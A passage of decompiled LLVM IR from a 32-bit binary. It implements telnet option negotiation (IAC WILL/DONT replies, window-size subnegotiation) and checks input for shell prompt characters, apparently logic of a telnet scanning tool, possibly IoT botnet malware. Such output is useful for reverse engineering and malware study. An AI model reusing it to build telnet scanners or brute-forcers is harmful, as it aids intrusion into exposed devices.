  %v0_8050cd6 = phi i32 [ %v1_8050a26, %dec_label_pc_8050a2f.preheader ], [ %v1_8050a60, %dec_label_pc_8050a60 ]
  %v3_8050a2f = add i32 %v2_8050a2f, %v0_8050cd6
  %v4_8050a2f = inttoptr i32 %v3_8050a2f to i8*
  %v5_8050a2f = load i8, i8* %v4_8050a2f, align 1
  %v6_8050a2f = zext i8 %v5_8050a2f to i32
  %v8_8050a2f = and i32 %v7_8050a2f, -256
  %v9_8050a2f = or i32 %v6_8050a2f, %v8_8050a2f
  store i32 %v9_8050a2f, i32* %edx.global-to-local, align 4
  %v10_8050a33 = icmp eq i8 %v5_8050a2f, 58
  br i1 %v10_8050a33, label %dec_label_pc_8050cd6, label %dec_label_pc_8050a3c

dec_label_pc_8050a3c:                             ; preds = %dec_label_pc_8050a2f
  %v10_8050a3c = icmp eq i8 %v5_8050a2f, 62
  br i1 %v10_8050a3c, label %dec_label_pc_8050cd6, label %dec_label_pc_8050a45

dec_label_pc_8050a45:                             ; preds = %dec_label_pc_8050a3c
  %v10_8050a45 = icmp eq i8 %v5_8050a2f, 36
  br i1 %v10_8050a45, label %dec_label_pc_8050cd6, label %dec_label_pc_8050a4e

dec_label_pc_8050a4e:                             ; preds = %dec_label_pc_8050a45
  %v10_8050a4e = icmp eq i8 %v5_8050a2f, 35
  br i1 %v10_8050a4e, label %dec_label_pc_8050cd6, label %dec_label_pc_8050a57

dec_label_pc_8050a57:                             ; preds = %dec_label_pc_8050a4e
  %v10_8050a57 = icmp eq i8 %v5_8050a2f, 37
  br i1 %v10_8050a57, label %dec_label_pc_8050cd6, label %dec_label_pc_8050a60

dec_label_pc_8050a60:                             ; preds = %dec_label_pc_8050a57
  %v1_8050a60 = add i32 %v0_8050cd6, -1
  %v8_8050a60 = icmp eq i32 %v1_8050a60, 0
  store i32 %v1_8050a60, i32* %eax.global-to-local, align 4
  %v1_8050a61 = icmp eq i1 %v8_8050a60, false
  br i1 %v1_8050a61, label %dec_label_pc_8050a2f, label %dec_label_pc_80505d3.backedge

dec_label_pc_8050a68:                             ; preds = %dec_label_pc_8050674
  %v1_8050a68 = add i32 %v0_8050662, 2
  store i32 %v1_8050a68, i32* @ebx, align 4
  %v1_8050a6b = add i32 %v0_8050a6b, 2
  store i32 %v1_8050a6b, i32* @ebp, align 4
  br label %dec_label_pc_805065e.backedge

dec_label_pc_805065e.backedge:                    ; preds = %dec_label_pc_8050a68, %dec_label_pc_8050e8a
  %v0_80506dc128 = phi i32 [ %v0_80506dc129, %dec_label_pc_8050a68 ], [ %v0_8050ec3, %dec_label_pc_8050e8a ]
  %v1_805065e = phi i32 [ %v1_805066e, %dec_label_pc_8050a68 ], [ %v3_8050ec3, %dec_label_pc_8050e8a ]
  %v0_805065e = phi i32 [ %v1_8050a6b, %dec_label_pc_8050a68 ], [ %v0_805065e.pre, %dec_label_pc_8050e8a ]
  %v5_8050674109 = phi i32 [ %v7_8050674, %dec_label_pc_8050a68 ], [ %v0_8050ebb, %dec_label_pc_8050e8a ]
  %v0_8050667104 = phi i32 [ %v0_8050a80, %dec_label_pc_8050a68 ], [ %v1_8050ec0, %dec_label_pc_8050e8a ]
  %v2_805065e = sub i32 %v0_805065e, %v1_805065e
  %v8_805065e = xor i32 %v0_805065e, %v1_805065e
  %v9_805065e = xor i32 %v2_805065e, %v0_805065e
  %v10_805065e = and i32 %v9_805065e, %v8_805065e
  %v11_805065e = icmp slt i32 %v10_805065e, 0
  %v13_805065e = icmp slt i32 %v2_805065e, 0
  %v2_8050660 = icmp eq i1 %v13_805065e, %v11_805065e
  br i1 %v2_8050660, label %dec_label_pc_80506d4, label %dec_label_pc_8050662.preheader

dec_label_pc_8050a73:                             ; preds = %dec_label_pc_8050ce2, %dec_label_pc_80509b6, %dec_label_pc_80508f4, %dec_label_pc_8050c69, %dec_label_pc_8050d5b, %dec_label_pc_8050c17, %dec_label_pc_8050bc6, %dec_label_pc_80506d4, %dec_label_pc_8050dd4
  %v0_8050a73 = phi i32 [ %v1_8050cd6, %dec_label_pc_8050ce2 ], [ %v1_80509aa160, %dec_label_pc_80509b6 ], [ %v0_80508eb, %dec_label_pc_80508f4 ], [ %v1_8050c5d, %dec_label_pc_8050c69 ], [ %v1_8050d4f, %dec_label_pc_8050d5b ], [ %v0_8050c17, %dec_label_pc_8050c17 ], [ %v0_8050bc6, %dec_label_pc_8050bc6 ], [ %v0_80506d4, %dec_label_pc_80506d4 ], [ %v1_8050dc8, %dec_label_pc_8050dd4 ]
  %v1_8050a73 = icmp eq i32 %v0_8050a73, 0
  %v1_8050a75 = icmp eq i1 %v1_8050a73, false
  br i1 %v1_8050a75, label %dec_label_pc_8050941, label %dec_label_pc_80505d3.loopexit12.loopexit

dec_label_pc_8050a80:                             ; preds = %dec_label_pc_805067f
  %v1_8050a80 = add i32 %v0_8050a80, 1879
  %v2_8050a80 = inttoptr i32 %v1_8050a80 to i8*
  store i8 -1, i8* %v2_8050a80, align 1
  %v0_8050a88 = load i32, i32* @esp, align 4
  %v1_8050a88 = add i32 %v0_8050a88, 1880
  %v2_8050a88 = inttoptr i32 %v1_8050a88 to i8*
  store i8 -5, i8* %v2_8050a88, align 1
  %v0_8050a90 = load i32, i32* @esp, align 4
  %v1_8050a90 = add i32 %v0_8050a90, 1881
  %v2_8050a90 = inttoptr i32 %v1_8050a90 to i8*
  store i8 31, i8* %v2_8050a90, align 1
  %v0_8050a98 = load i32, i32* @esp, align 4
  %v1_8050a98 = add i32 %v0_8050a98, 1847
  %v2_8050a98 = inttoptr i32 %v1_8050a98 to i8*
  store i8 -1, i8* %v2_8050a98, align 1
  %v0_8050aa0 = load i32, i32* @esp, align 4
  %v1_8050aa0 = add i32 %v0_8050aa0, 1848
  %v2_8050aa0 = inttoptr i32 %v1_8050aa0 to i8*
  store i8 -6, i8* %v2_8050aa0, align 1
  %v0_8050aa8 = load i32, i32* @esp, align 4
  %v1_8050aa8 = add i32 %v0_8050aa8, 1849
  %v2_8050aa8 = inttoptr i32 %v1_8050aa8 to i8*
  store i8 31, i8* %v2_8050aa8, align 1
  %v0_8050ab0 = load i32, i32* @esp, align 4
  %v1_8050ab0 = add i32 %v0_8050ab0, 1850
  %v2_8050ab0 = inttoptr i32 %v1_8050ab0 to i8*
  store i8 0, i8* %v2_8050ab0, align 1
  %v0_8050ab8 = load i32, i32* @esp, align 4
  %v1_8050ab8 = add i32 %v0_8050ab8, 1851
  %v2_8050ab8 = inttoptr i32 %v1_8050ab8 to i8*
  store i8 80, i8* %v2_8050ab8, align 1
  %v0_8050ac0 = load i32, i32* @esp, align 4
  %v1_8050ac0 = add i32 %v0_8050ac0, 1852
  %v2_8050ac0 = inttoptr i32 %v1_8050ac0 to i8*
  store i8 0, i8* %v2_8050ac0, align 1
  %v0_8050ac8 = load i32, i32* @esp, align 4
  %v1_8050ac8 = add i32 %v0_8050ac8, 1853
  %v2_8050ac8 = inttoptr i32 %v1_8050ac8 to i8*
  store i8 24, i8* %v2_8050ac8, align 1
  %v0_8050ad0 = load i32, i32* @esp, align 4
  %v1_8050ad0 = add i32 %v0_8050ad0, 1854
  %v2_8050ad0 = inttoptr i32 %v1_8050ad0 to i8*
  store i8 -1, i8* %v2_8050ad0, align 1
  %v0_8050ad8 = load i32, i32* @esp, align 4
  %v1_8050ad8 = add i32 %v0_8050ad8, 1855
  %v2_8050ad8 = inttoptr i32 %v1_8050ad8 to i8*
  store i8 -16, i8* %v2_8050ad8, align 1
  %v0_8050ae0 = load i32, i32* @esp, align 4
  %v1_8050ae0 = add i32 %v0_8050ae0, 16
  %v2_8050ae0 = inttoptr i32 %v1_8050ae0 to i32*
  %v3_8050ae0 = load i32, i32* %v2_8050ae0, align 4
  store i32 %v3_8050ae0, i32* %eax.global-to-local, align 4
  %v0_8050ae4 = load i32, i32* @edi, align 4
  %v1_8050ae4 = add i32 %v0_8050ae4, 24
  %v2_8050ae4 = inttoptr i32 %v1_8050ae4 to i32*
  %v3_8050ae4 = load i32, i32* %v2_8050ae4, align 4
  store i32 %v3_8050ae4, i32* %ecx.global-to-local, align 4
  %v0_8050ae7 = load i32, i32* @ebx, align 4
  %v1_8050ae7 = add i32 %v0_8050ae7, 2
  store i32 %v1_8050ae7, i32* %edx.global-to-local, align 4
  %v2_8050aea = add i32 %v3_8050ae4, %v3_8050ae0
  store i32 %v2_8050aea, i32* %eax.global-to-local, align 4
  %tmp299 = icmp ugt i32 %v2_8050aea, %v1_8050ae7
  br i1 %tmp299, label %dec_label_pc_8050af4, label %dec_label_pc_8050a80.dec_label_pc_80506d4.loopexit_crit_edge

dec_label_pc_8050a80.dec_label_pc_80506d4.loopexit_crit_edge: ; preds = %dec_label_pc_8050a80
  %v0_80506d4.pre.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80506d4

dec_label_pc_8050af4:                             ; preds = %dec_label_pc_8050a80
  %v2_8050af4 = inttoptr i32 %v1_8050ae7 to i8*
  %v3_8050af4 = load i8, i8* %v2_8050af4, align 1
  %v12_8050af4 = icmp eq i8 %v3_8050af4, 31
  br i1 %v12_8050af4, label %dec_label_pc_8050e8a, label %dec_label_pc_8050afe

dec_label_pc_8050afe:                             ; preds = %dec_label_pc_8050af4
  %v1_8050afe = inttoptr i32 %v0_8050ae7 to i8*
  %v2_8050afe = load i8, i8* %v1_8050afe, align 1
  %v3_8050afe = zext i8 %v2_8050afe to i32
  %v5_8050afe = and i32 %v2_8050aea, -256
  %v6_8050afe = or i32 %v3_8050afe, %v5_8050afe
  store i32 %v6_8050afe, i32* %eax.global-to-local, align 4
  %v11_8050b00 = icmp eq i8 %v2_8050afe, -3
  %v1_8050b02 = icmp eq i1 %v11_8050b00, false
  br i1 %v1_8050b02, label %dec_label_pc_8051053, label %dec_label_pc_8050b08

dec_label_pc_8050b08:                             ; preds = %dec_label_pc_8050afe
  store i8 -4, i8* %v1_8050afe, align 1
  %v0_8050b0b = load i32, i32* @esi, align 4
  %v1_8050b0b = inttoptr i32 %v0_8050b0b to i8*
  %v2_8050b0b = load i8, i8* %v1_8050b0b, align 1
  %v3_8050b0b = zext i8 %v2_8050b0b to i32
  %v4_8050b0b = load i32, i32* %eax.global-to-local, align 4
  %v5_8050b0b = and i32 %v4_8050b0b, -256
  %v6_8050b0b = or i32 %v5_8050b0b, %v3_8050b0b
  store i32 %v6_8050b0b, i32* %eax.global-to-local, align 4
  %v11_8050b0d = icmp eq i8 %v2_8050b0b, -3
  %v1_8050b0f = icmp eq i1 %v11_8050b0d, false
  br i1 %v1_8050b0f, label %dec_label_pc_8050698, label %dec_label_pc_8050b15

dec_label_pc_8050b15:                             ; preds = %dec_label_pc_8050b08, %dec_label_pc_805068e
  %v0_8050b15 = phi i32 [ %v0_8050b0b, %dec_label_pc_8050b08 ], [ %v0_805068e, %dec_label_pc_805068e ]
  %v1_8050b15 = inttoptr i32 %v0_8050b15 to i8*
  store i8 -4, i8* %v1_8050b15, align 1
  %v0_8050b18 = load i32, i32* @ebx, align 4
  %v1_8050b18 = add i32 %v0_8050b18, 2
  %v2_8050b18 = inttoptr i32 %v1_8050b18 to i8*
  %v3_8050b18 = load i8, i8* %v2_8050b18, align 1
  %v4_8050b18 = zext i8 %v3_8050b18 to i32
  %v5_8050b18 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050b18 = and i32 %v5_8050b18, -256
  %v7_8050b18 = or i32 %v6_8050b18, %v4_8050b18
  store i32 %v7_8050b18, i32* %eax.global-to-local, align 4
  %v11_8050b1b = icmp eq i8 %v3_8050b18, -3
  %v1_8050b1d = icmp eq i1 %v11_8050b1b, false
  br i1 %v1_8050b1d, label %dec_label_pc_80506ab, label %dec_label_pc_8050b23

dec_label_pc_8050b23:                             ; preds = %dec_label_pc_8050b15, %dec_label_pc_80506a0
  %v0_8050b23 = phi i32 [ %v0_8050b18, %dec_label_pc_8050b15 ], [ %v0_80506a0, %dec_label_pc_80506a0 ]
  %v1_8050b23 = add i32 %v0_8050b23, 2
  %v2_8050b23 = inttoptr i32 %v1_8050b23 to i8*
  store i8 -4, i8* %v2_8050b23, align 1
  br label %dec_label_pc_80506b3

dec_label_pc_8050b2c:                             ; preds = %dec_label_pc_80505ee
  %v1_805061b = icmp eq i32 %v0_8050613, 0
  br i1 %v1_805061b, label %dec_label_pc_8051038, label %dec_label_pc_8050b32

dec_label_pc_8050b32:                             ; preds = %dec_label_pc_8050b2c
  %v10_8050b32 = icmp eq i32 %v0_8050613, -1
  %v1_8050b35 = icmp eq i1 %v10_8050b32, false
  br i1 %v1_8050b35, label %dec_label_pc_8050635, label %dec_label_pc_8050b3b

dec_label_pc_8050b3b:                             ; preds = %dec_label_pc_8050b32
  %v1_8050b3b = add i32 %v0_8050618, 56
  %v2_8050b3b = inttoptr i32 %v1_8050b3b to i32*
  %v3_8050b3b = load i32, i32* %v2_8050b3b, align 4
  store i32 %v3_8050b3b, i32* %edx.global-to-local, align 4
  %v1_8050b3f = inttoptr i32 %v3_8050b3b to i32*
  %v2_8050b3f = load i32, i32* %v1_8050b3f, align 4
  %v11_8050b3f = icmp eq i32 %v2_8050b3f, 11
  br i1 %v11_8050b3f, label %dec_label_pc_805057e, label %dec_label_pc_8050b48

dec_label_pc_8050b48:                             ; preds = %dec_label_pc_8050b3b, %dec_label_pc_8051038
  %v0_8050b48 = phi i32 [ %v1_8050618, %dec_label_pc_8050b3b ], [ %v0_8050b48.pre, %dec_label_pc_8051038 ]
  %v0_8050b4b = load i32, i32* @edi, align 4
  %v1_8050b4b = add i32 %v0_8050b4b, 4
  %v2_8050b4b = inttoptr i32 %v1_8050b4b to i32*
  %v3_8050b4b = load i32, i32* %v2_8050b4b, align 4
  store i32 %v3_8050b4b, i32* @esi, align 4
  %v2_8050b4e = add i32 %v0_8050b48, -16
  %v3_8050b4e = inttoptr i32 %v2_8050b4e to i32*
  store i32 %v3_8050b4b, i32* %v3_8050b4e, align 4
  %v1_8050b4f = call i32 @function_80521e1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050b4f, i32* %eax.global-to-local, align 4
  %v0_8050b54 = load i32, i32* @edi, align 4
  %v1_8050b54 = add i32 %v0_8050b54, 284
  %v2_8050b54 = inttoptr i32 %v1_8050b54 to i8*
  %v3_8050b54 = load i8, i8* %v2_8050b54, align 1
  %v4_8050b54 = zext i8 %v3_8050b54 to i32
  %v6_8050b54 = and i32 %v1_8050b4f, -256
  %v7_8050b54 = or i32 %v4_8050b54, %v6_8050b54
  %v1_8050b5d = add i32 %v7_8050b54, 1
  store i32 %v1_8050b5d, i32* %eax.global-to-local, align 4
  %v1_8050b5e = add i32 %v0_8050b54, 4
  %v2_8050b5e = inttoptr i32 %v1_8050b5e to i32*
  store i32 -1, i32* %v2_8050b5e, align 4
  %v0_8050b65 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b65 = trunc i32 %v0_8050b65 to i8
  %v2_8050b65 = load i32, i32* @edi, align 4
  %v3_8050b65 = add i32 %v2_8050b65, 284
  %v4_8050b65 = inttoptr i32 %v3_8050b65 to i8*
  store i8 %v1_8050b65, i8* %v4_8050b65, align 1
  %v0_8050b6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b6b = trunc i32 %v0_8050b6b to i8
  %tmp300 = icmp ult i8 %v1_8050b6b, 10
  %v0_8051047 = load i32, i32* @edi, align 4
  br i1 %tmp300, label %dec_label_pc_8051047, label %dec_label_pc_8050b73

dec_label_pc_8050b73:                             ; preds = %dec_label_pc_8050b48
  %v1_8050b73 = add i32 %v0_8051047, 284
  %v2_8050b73 = inttoptr i32 %v1_8050b73 to i8*
  store i8 0, i8* %v2_8050b73, align 1
  %v0_8050b7a = load i32, i32* @edi, align 4
  %v1_8050b7a = add i32 %v0_8050b7a, 12
  %v2_8050b7a = inttoptr i32 %v1_8050b7a to i32*
  store i32 0, i32* %v2_8050b7a, align 4
  br label %dec_label_pc_805057e

dec_label_pc_8050b86:                             ; preds = %dec_label_pc_8050698
  %v1_8050b86 = inttoptr i32 %v0_8050b86 to i8*
  store i8 -3, i8* %v1_8050b86, align 1
  %v5_80506a0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506a0

dec_label_pc_8050b8e:                             ; preds = %dec_label_pc_80506ab
  %v1_8050b8e = add i32 %v0_8050b8e, 2
  %v2_8050b8e = inttoptr i32 %v1_8050b8e to i8*
  store i8 -3, i8* %v2_8050b8e, align 1
  br label %dec_label_pc_80506b3

dec_label_pc_8050b97:                             ; preds = %dec_label_pc_80505da
  %v0_8050b97 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050b97, i32* %edx.global-to-local, align 4
  %v1_8050b99 = load i32, i32* @esp, align 4
  %v2_8050b99 = add i32 %v1_8050b99, -4
  %v3_8050b99 = inttoptr i32 %v2_8050b99 to i32*
  store i32 %v0_8050b97, i32* %v3_8050b99, align 4
  %v0_8050b9a = load i32, i32* @edi, align 4
  %v1_8050b9a = add i32 %v0_8050b9a, 92
  store i32 %v1_8050b9a, i32* %eax.global-to-local, align 4
  %v1_8050b9d = add i32 %v1_8050b99, -8
  %v2_8050b9d = inttoptr i32 %v1_8050b9d to i32*
  store i32 192, i32* %v2_8050b9d, align 4
  %v0_8050ba2 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ba2 = add i32 %v1_8050b99, -12
  %v3_8050ba2 = inttoptr i32 %v2_8050ba2 to i32*
  store i32 %v0_8050ba2, i32* %v3_8050ba2, align 4
  %v0_8050ba3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050ba3 = add i32 %v1_8050b99, -16
  %v3_8050ba3 = inttoptr i32 %v2_8050ba3 to i32*
  store i32 %v0_8050ba3, i32* %v3_8050ba3, align 4
  %v4_8050ba4 = call i32 @function_8052743(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8050ba4, i32* %eax.global-to-local, align 4
  %v0_8050ba9 = load i32, i32* @edi, align 4
  %v1_8050ba9 = add i32 %v0_8050ba9, 24
  %v2_8050ba9 = inttoptr i32 %v1_8050ba9 to i32*
  %v3_8050ba9 = load i32, i32* %v2_8050ba9, align 4
  %v1_8050bac = add i32 %v3_8050ba9, -64
  store i32 %v1_8050bac, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bac, i32* %v2_8050ba9, align 4
  br label %dec_label_pc_80505ee

dec_label_pc_8050bba:                             ; preds = %dec_label_pc_805071a, %dec_label_pc_8050711, %dec_label_pc_8050708, %dec_label_pc_80506ff, %dec_label_pc_80506f2
  %v1_8050bba = add i32 %v0_8050bba, 1
  store i32 %v1_8050bba, i32* @ebp, align 4
  %v10_8050bbd = icmp eq i32 %v0_8050bba, -2
  br i1 %v10_8050bbd, label %dec_label_pc_8050726, label %dec_label_pc_8050bc6

dec_label_pc_8050bc6:                             ; preds = %dec_label_pc_8050bba, %dec_label_pc_8050746, %dec_label_pc_8050726
  %v0_8050bc6 = phi i32 [ %v1_8050bba, %dec_label_pc_8050bba ], [ %v0_8050756, %dec_label_pc_8050746 ], [ %v0_8050733, %dec_label_pc_8050726 ]
  %tmp148 = icmp slt i32 %v0_8050bc6, 1
  br i1 %tmp148, label %dec_label_pc_8050a73, label %dec_label_pc_8050bce

dec_label_pc_8050bce:                             ; preds = %dec_label_pc_8050bc6
  %v0_8050bce = load i32, i32* @edi, align 4
  %v1_8050bce = inttoptr i32 %v0_8050bce to i32*
  %v2_8050bce = load i32, i32* %v1_8050bce, align 4
  store i32 %v2_8050bce, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050bd2 = load i32, i32* @esp, align 4
  %v1_8050bd2 = add i32 %v0_8050bd2, -4
  %v2_8050bd2 = inttoptr i32 %v1_8050bd2 to i32*
  store i32 16384, i32* %v2_8050bd2, align 4
  %v0_8050bd7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050bd7 = add i32 %v0_8050bd7, 12
  %v2_8050bd7 = inttoptr i32 %v1_8050bd7 to i8*
  %v3_8050bd7 = load i8, i8* %v2_8050bd7, align 1
  %v4_8050bd7 = zext i8 %v3_8050bd7 to i32
  %v5_8050bd7 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050bd7 = and i32 %v5_8050bd7, -256
  %v7_8050bd7 = or i32 %v6_8050bd7, %v4_8050bd7
  store i32 %v7_8050bd7, i32* %eax.global-to-local, align 4
  %v2_8050bda = add i32 %v0_8050bd2, -8
  %v3_8050bda = inttoptr i32 %v2_8050bda to i32*
  store i32 %v7_8050bd7, i32* %v3_8050bda, align 4
  %v0_8050bdb = load i32, i32* %edx.global-to-local, align 4
  %v1_8050bdb = inttoptr i32 %v0_8050bdb to i32*
  %v2_8050bdb = load i32, i32* %v1_8050bdb, align 4
  store i32 %v2_8050bdb, i32* %eax.global-to-local, align 4
  %v2_8050bdd = add i32 %v0_8050bd2, -12
  %v3_8050bdd = inttoptr i32 %v2_8050bdd to i32*
  store i32 %v2_8050bdb, i32* %v3_8050bdd, align 4
  %v0_8050bde = load i32, i32* @edi, align 4
  %v1_8050bde = add i32 %v0_8050bde, 4
  %v2_8050bde = inttoptr i32 %v1_8050bde to i32*
  %v3_8050bde = load i32, i32* %v2_8050bde, align 4
  store i32 %v3_8050bde, i32* %eax.global-to-local, align 4
  %v2_8050be1 = add i32 %v0_8050bd2, -16
  %v3_8050be1 = inttoptr i32 %v2_8050be1 to i32*
  store i32 %v3_8050bde, i32* %v3_8050be1, align 4
  %v0_8050be2 = call i32 @function_8052924()
  store i32 %v0_8050be2, i32* %eax.global-to-local, align 4
  %v0_8050be7 = load i32, i32* @esp, align 4
  %v1_8050be7 = add i32 %v0_8050be7, -4
  %v2_8050be7 = inttoptr i32 %v1_8050be7 to i32*
  store i32 16384, i32* %v2_8050be7, align 4
  %v1_8050bec = add i32 %v0_8050be7, -8
  %v2_8050bec = inttoptr i32 %v1_8050bec to i32*
  store i32 2, i32* %v2_8050bec, align 4
  %v1_8050bee = add i32 %v0_8050be7, -12
  %v2_8050bee = inttoptr i32 %v1_8050bee to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_8050bee, align 4
  %v0_8050bf3 = load i32, i32* @edi, align 4
  %v1_8050bf3 = add i32 %v0_8050bf3, 4
  %v2_8050bf3 = inttoptr i32 %v1_8050bf3 to i32*
  %v3_8050bf3 = load i32, i32* %v2_8050bf3, align 4
  store i32 %v3_8050bf3, i32* %eax.global-to-local, align 4
  %v2_8050bf6 = add i32 %v0_8050be7, -16
  %v3_8050bf6 = inttoptr i32 %v2_8050bf6 to i32*
  store i32 %v3_8050bf3, i32* %v3_8050bf6, align 4
  %v0_8050bf7 = call i32 @function_8052924()
  store i32 %v0_8050bf7, i32* %eax.global-to-local, align 4
  %v0_8050bff = load i32, i32* @edi, align 4
  %v1_8050bff = add i32 %v0_8050bff, 12
  %v2_8050bff = inttoptr i32 %v1_8050bff to i32*
  store i32 4, i32* %v2_8050bff, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050c0b:                             ; preds = %dec_label_pc_8050799, %dec_label_pc_8050790, %dec_label_pc_8050787, %dec_label_pc_805077a
  %v1_8050c0b = add i32 %v0_8050c0b, 1
  store i32 %v1_8050c0b, i32* @ebp, align 4
  %v10_8050c0e = icmp eq i32 %v0_8050c0b, -2
  br i1 %v10_8050c0e, label %dec_label_pc_80507a5, label %dec_label_pc_8050c17

dec_label_pc_8050c17:                             ; preds = %dec_label_pc_8050c0b, %dec_label_pc_80507a5
  %v0_8050c17 = phi i32 [ %v1_8050c0b, %dec_label_pc_8050c0b ], [ %v0_80507b2, %dec_label_pc_80507a5 ]
  %tmp149 = icmp slt i32 %v0_8050c17, 1
  br i1 %tmp149, label %dec_label_pc_8050a73, label %dec_label_pc_8050c1f

dec_label_pc_8050c1f:                             ; preds = %dec_label_pc_8050c17
  %v0_8050c1f = load i32, i32* @edi, align 4
  %v1_8050c1f = inttoptr i32 %v0_8050c1f to i32*
  %v2_8050c1f = load i32, i32* %v1_8050c1f, align 4
  store i32 %v2_8050c1f, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8050c23 = load i32, i32* @esp, align 4
  %v1_8050c23 = add i32 %v0_8050c23, -4
  %v2_8050c23 = inttoptr i32 %v1_8050c23 to i32*
  store i32 16384, i32* %v2_8050c23, align 4
  %v0_8050c28 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c28 = add i32 %v0_8050c28, 13
  %v2_8050c28 = inttoptr i32 %v1_8050c28 to i8*
  %v3_8050c28 = load i8, i8* %v2_8050c28, align 1
  %v4_8050c28 = zext i8 %v3_8050c28 to i32
  %v5_8050c28 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050c28 = and i32 %v5_8050c28, -256
  %v7_8050c28 = or i32 %v6_8050c28, %v4_8050c28
  store i32 %v7_8050c28, i32* %eax.global-to-local, align 4
  %v2_8050c2b = add i32 %v0_8050c23, -8
  %v3_8050c2b = inttoptr i32 %v2_8050c2b to i32*
  store i32 %v7_8050c28, i32* %v3_8050c2b, align 4
  %v0_8050c2c = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c2c = add i32 %v0_8050c2c, 4
  %v2_8050c2c = inttoptr i32 %v1_8050c2c to i32*
  %v3_8050c2c = load i32, i32* %v2_8050c2c, align 4
  store i32 %v3_8050c2c, i32* @esi, align 4
  %v2_8050c2f = add i32 %v0_8050c23, -12
  %v3_8050c2f = inttoptr i32 %v2_8050c2f to i32*
  store i32 %v3_8050c2c, i32* %v3_8050c2f, align 4
  %v0_8050c30 = load i32, i32* @edi, align 4
  %v1_8050c30 = add i32 %v0_8050c30, 4
  %v2_8050c30 = inttoptr i32 %v1_8050c30 to i32*
  %v3_8050c30 = load i32, i32* %v2_8050c30, align 4
  store i32 %v3_8050c30, i32* @ebx, align 4
  %v2_8050c33 = add i32 %v0_8050c23, -16
  %v3_8050c33 = inttoptr i32 %v2_8050c33 to i32*
  store i32 %v3_8050c30, i32* %v3_8050c33, align 4
  %v0_8050c34 = call i32 @function_8052924()
  store i32 %v0_8050c34, i32* %eax.global-to-local, align 4
  %v0_8050c39 = load i32, i32* @esp, align 4
  %v1_8050c39 = add i32 %v0_8050c39, -4
  %v2_8050c39 = inttoptr i32 %v1_8050c39 to i32*
  store i32 16384, i32* %v2_8050c39, align 4
  %v1_8050c3e = add i32 %v0_8050c39, -8
  %v2_8050c3e = inttoptr i32 %v1_8050c3e to i32*
  store i32 2, i32* %v2_8050c3e, align 4
  %v1_8050c40 = add i32 %v0_8050c39, -12
  %v2_8050c40 = inttoptr i32 %v1_8050c40 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_8050c40, align 4
  %v0_8050c45 = load i32, i32* @edi, align 4
  %v1_8050c45 = add i32 %v0_8050c45, 4
  %v2_8050c45 = inttoptr i32 %v1_8050c45 to i32*
  %v3_8050c45 = load i32, i32* %v2_8050c45, align 4
  store i32 %v3_8050c45, i32* %ecx.global-to-local, align 4
  %v2_8050c48 = add i32 %v0_8050c39, -16
  %v3_8050c48 = inttoptr i32 %v2_8050c48 to i32*
  store i32 %v3_8050c45, i32* %v3_8050c48, align 4
  %v0_8050c49 = call i32 @function_8052924()
  store i32 %v0_8050c49, i32* %eax.global-to-local, align 4
  %v0_8050c51 = load i32, i32* @edi, align 4
  %v1_8050c51 = add i32 %v0_8050c51, 12
  %v2_8050c51 = inttoptr i32 %v1_8050c51 to i32*
  store i32 5, i32* %v2_8050c51, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050c5d:                             ; preds = %dec_label_pc_8050849, %dec_label_pc_8050840, %dec_label_pc_8050837, %dec_label_pc_805082e, %dec_label_pc_8050821
  %v1_8050c5d = add i32 %v0_8050c5d, 1
  store i32 %v1_8050c5d, i32* @ebp, align 4
  %v10_8050c60 = icmp eq i32 %v0_8050c5d, -2
  br i1 %v10_8050c60, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_8050c69

dec_label_pc_8050c69:                             ; preds = %dec_label_pc_8050c5d
  %tmp150 = icmp slt i32 %v1_8050c5d, 1
  br i1 %tmp150, label %dec_label_pc_8050a73, label %dec_label_pc_8050c71

dec_label_pc_8050c71:                             ; preds = %dec_label_pc_8050c69
  %v0_8050c71 = load i32, i32* @esp, align 4
  %v1_8050c74 = add i32 %v0_8050c71, -16
  %v2_8050c74 = inttoptr i32 %v1_8050c74 to i32*
  store i32 22, i32* %v2_8050c74, align 4
  %v2_8050c76 = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050c76, i32* %eax.global-to-local, align 4
  %v0_8050c7b = load i32, i32* @esp, align 4
  %v1_8050c7b = inttoptr i32 %v0_8050c7b to i32*
  %v2_8050c7b = load i32, i32* %v1_8050c7b, align 4
  store i32 %v2_8050c7b, i32* %eax.global-to-local, align 4
  %v3_8050c7b = add i32 %v0_8050c7b, 4
  %v1_8050c7c = inttoptr i32 %v3_8050c7b to i32*
  %v2_8050c7c = load i32, i32* %v1_8050c7c, align 4
  store i32 %v2_8050c7c, i32* %edx.global-to-local, align 4
  %v1_8050c7d = add i32 %v0_8050c7b, 1888
  store i32 %v1_8050c7d, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c7d, i32* %v1_8050c7c, align 4
  store i32 22, i32* %v1_8050c7b, align 4
  %v3_8050c87 = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050c87, i32* %eax.global-to-local, align 4
  %v0_8050c8c = load i32, i32* @esp, align 4
  %v1_8050c8c = add i32 %v0_8050c8c, -4
